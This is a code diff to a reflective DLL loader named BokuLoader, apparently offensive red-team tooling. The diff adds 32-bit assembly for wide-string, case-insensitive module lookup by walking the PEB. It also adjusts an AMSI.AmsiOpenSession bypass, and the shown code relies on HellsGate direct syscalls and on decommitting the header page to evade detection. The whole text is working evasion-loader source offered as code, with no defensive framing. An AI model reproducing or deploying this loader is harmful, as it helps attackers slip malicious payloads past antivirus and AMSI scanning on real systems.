@@ -6,6 +6,7 @@
 #include <windows.h>
 
 void* getDllBase(void*) asm ("getDllBase");
+void  makeWideString(void*, void*) asm ("makeWideString");
 void* getExportDirectory(void* dllAddr) asm ("getExportDirectory");
 void* getExportAddressTable(void* dllBase, void* dllExportDirectory) asm ("getExportAddressTable");
 void* getExportNameTable(void* dllBase, void* dllExportDirectory) asm ("getExportNameTable");
@@ -163,7 +164,6 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     HellsGate((void*)(ULONG_PTR)NtAllocSyscallNumber);
     HellDescent((HANDLE)-1, &rdll_dst.dllBase, 0, &rdll_src.size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
     #else
-    //__debugbreak();
     rdll_dst.dllBase = (void*)pVirtualAlloc(NULL, (SIZE_T)rdll_src.size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
     #endif
 
@@ -178,7 +178,6 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     pVirtualFree(rdll_dst.dllBase,1,0x00004000); // Decommit the first memory page (4096/0x1000 bytes) which would normally hold the copied over headers  - "Private:Reserved"
     #endif
     #else
-    //__debugbreak();
     copyMemory(rdll_src.SizeOfHeaders, rdll_src.dllBase, rdll_dst.dllBase);
     #endif
 
@@ -261,7 +260,9 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     // The last entry in the image import directory is all zeros
     while(importNameRVA)
     {
-        dll_import.dllBase = (void*)getDllBase(importName);
+        char ws_importName[150];
+        makeWideString(ws_importName, importName);
+        dll_import.dllBase = (void*)getDllBase(ws_importName);
         // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
         if (dll_import.dllBase == NULL){
             dll_import.dllBase = (void*)pLoadLibraryA((char*)(importName));
@@ -500,7 +501,7 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
     tVirtualProtect pVirtualProtect  = (tVirtualProtect)getSymbolAddress(vp, (void*)14, k32->dllBase, k32->Export.AddressTable, k32->Export.NameTable, k32->Export.OrdinalTable);
     #endif
     // ######### AMSI.AmsiOpenSession Bypass
-    char as[] = {'a','m','s','i','.','d','l','l',0};
+    char as[] = {'a',0,'m',0,'s',0,'i',0,'.',0,'d',0,'l',0,'l',0,0};
     Dll amsi;
     amsi.dllBase = (void*)getDllBase((void*)as); // check if amsi.dll is already loaded into the process
     if (amsi.dllBase == NULL){ // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
@@ -615,17 +616,22 @@ __asm__(
     "mov eax, ecx \n"              // Return the base address of our reflective DLL
     "ret \n"                       // return initRdllAddr
 "getDllBase: \n"
-    "mov ecx, [esp+0x4] \n"        // load the first param in ecx
-    "mov ecx, [ecx] \n"            // First 4 bytes of string
-"getMemList: \n"
     "mov ebx, fs:[0x30] \n"        // ProcessEnvironmentBlock // FS = TEB
     "mov ebx, [ebx+0x0c] \n"       // _PEB_LDR_DATA
     "mov ebx, [ebx+0x14] \n"       // InMemoryOrderModuleList - First Entry (probably the host PE File)
     "mov edx, ebx \n"
 "crawl: \n"
     "mov eax, [ebx+0x28] \n"       // BaseDllName Buffer
-    "mov eax, [eax] \n"            // First 4 Unicode bytes of the DLL string from the Ldr List // TODO: this check in 32 bits sucks (even more)
-    "cmp eax, ecx \n"
+    "mov ecx, [esp+0x4] \n"        // load the first param in ecx
+    "push ebx \n"                  // just to save its value
+    "push edx \n"
+    "push eax \n"
+    "push ecx \n"
+    "call cmpstrings \n"
+    "add esp, 0x8 \n"
+    "pop edx \n"
+    "pop ebx \n"
+    "cmp eax, 0x1 \n"
     "je found \n"
     "mov ebx, [ebx] \n"            // InMemoryOrderLinks Next Entry
     "cmp edx, [ebx] \n"            // Are we back at the same entry in the list?
@@ -635,6 +641,54 @@ __asm__(
 "found: \n"
     "mov eax, [ebx+0x10] \n"       // DllBase Address in process memory
 "end: \n"
+    "ret \n"
+"makeWideString: \n"
+    "xor eax, eax \n"              // counter
+"makews: \n"
+    "mov ecx, [esp+0x4] \n"        // target
+    "mov edx, [esp+0x8] \n"        // source
+    "add edx, eax \n"              // add counter
+    "add ecx, eax \n"              // add counter
+    "add ecx, eax \n"              // add counter again
+    "dec ecx \n"                   // decrease by 1
+    "mov bl, 0x0 \n"               // write nulbyte
+    "mov [ecx], bl \n"
+    "inc ecx \n"                   // increase again
+    "mov bl, [edx] \n"
+    "mov [ecx], bl \n"             // copy char
+    "cmp bl, 0x0 \n"
+    "je madews\n"
+    "inc eax \n"
+    "jmp makews \n"
+"madews: \n"
+    "ret \n"
+"cmpstrings: \n"
+    "xor eax, eax \n"              // counter
+"cmpchar: \n"
+    "mov ecx, [esp+0x4] \n"
+    "mov cl, [ecx+eax] \n"         // load char
+    "cmp cl, 0x0 \n"
+    "je nolow1 \n"
+    "or cl, 0x20 \n"               // make lower case
+"nolow1: \n"
+    "mov edx, [esp+0x8] \n"
+    "mov dl, [edx+eax] \n"         // load char
+    "cmp dl, 0x0 \n"
+    "je nolow2 \n"
+    "or dl, 0x20 \n"               // make lower case
+"nolow2: \n"
+    "cmp cl, dl \n"                // compare
+    "jne nonequal \n"
+    "cmp cl, 0x0 \n"                // end of string?
+    "je equal \n"
+    "inc eax \n"                    // increase twice because they are wide-strings
+    "inc eax \n"
+    "jmp cmpchar \n"
+"nonequal: \n"
+    "mov eax, 0x0 \n"              // return "false"
+    "ret \n"
+"equal: \n"
+    "mov eax, 0x1 \n"              // return "true"
     "ret \n"
 "getExportDirectory: \n"
     "mov eax, [esp+0x4] \n"    // dllAddr
